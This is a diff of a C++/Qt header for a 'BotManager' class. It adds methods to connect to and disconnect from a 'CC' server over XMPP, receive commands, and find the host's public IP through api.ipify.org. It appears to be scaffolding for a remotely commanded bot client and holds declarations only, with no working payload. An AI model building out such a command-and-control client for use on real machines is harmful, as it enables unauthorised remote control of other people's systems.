@@ -3,25 +3,38 @@
 
 #include <QObject>
 
+#define IP_ADDRESS_API "https://api.ipify.org"
+
 class XmppClient;
+class Bot;
 class Message;
+class QNetworkAccessManager;
+class QNetworkReply;
 
 class BotManager : public QObject
 {
     Q_OBJECT
 public:
     static BotManager *instance();
-    bool start() const;
-    bool stop() const;
+signals:
+    void ready();
+public slots:
+    void connectToCC();
+    void disconnectFromCC();
 private slots:
-    void commandReceivedOnBot(const Message& command);
+    void commandReceivedOnBot(Message *command);
+    void finishedOnNetworkAccessManager(QNetworkReply *reply);
 private:
     BotManager();
     ~BotManager();
-    bool setup();
     void createConnections();
+    void setupConfig();
+    void setupBot(const QString& pubIp);
+    void sendHttpGetRequestToDiscoverIp();
 
-    XmppClient *_bot;
+    XmppClient *_xmppClient;
+    Bot *_bot;
+    QNetworkAccessManager *_networkAccessManager;
 };
 
 #endif // BOTMANAGER_H
